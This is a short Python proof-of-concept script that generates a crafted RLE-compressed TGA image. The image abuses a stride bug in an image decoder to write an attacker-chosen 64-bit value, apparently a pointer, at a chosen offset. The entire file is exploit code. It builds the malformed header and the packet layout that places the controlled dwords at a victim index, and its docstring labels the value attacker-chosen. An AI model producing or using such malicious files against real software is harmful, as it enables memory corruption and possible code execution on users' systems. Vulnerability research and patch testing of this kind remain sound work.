#!/usr/bin/env python3
"""Local TGA that writes an attacker-chosen 64-bit value at a chosen 4-byte-
aligned offset. Each RLE run packet supplies one chosen dword; packet lengths
place that dword at a chosen pixel index. Pixel index i writes file offset 4*i
because the vulnerable stride is (header bpp 32 + 7)/8 = 4 bytes.

usage: make-pointer-poc.py OUT.tga VICTIM_INDEX LOW32 HIGH32
"""
import struct
import sys

out_path, index_s, low_s, high_s = sys.argv[1:5]
victim_index = int(index_s)
low = int(low_s, 16) & 0xFFFFFFFF
high = int(high_s, 16) & 0xFFFFFFFF

hdr = bytes([0, 0, 9]) + struct.pack("<HHB", 0, 0, 0)
hdr += struct.pack("<HH", 0, 0) + struct.pack("<HH", 16, 16)
hdr += bytes([32, 0])

packets = []


def runs(total, value):
    while total > 0:
        count = min(128, total)
        packets.append((count, value))
        total -= count


runs(victim_index, 0x11223344)
packets.append((1, low))
packets.append((1, high))
runs(256 - victim_index - 2, 0x5A5A5A5A)

body = b"".join(bytes([0x80 | (count - 1)]) + struct.pack("<I", value & 0xFFFFFFFF)
                for count, value in packets)

with open(out_path, "wb") as f:
    f.write(hdr + body)

print(f"wrote {out_path} bytes={len(hdr)+len(body)} victim_index={victim_index} "
      f"value=0x{high:08x}{low:08x} packets={len(packets)}")
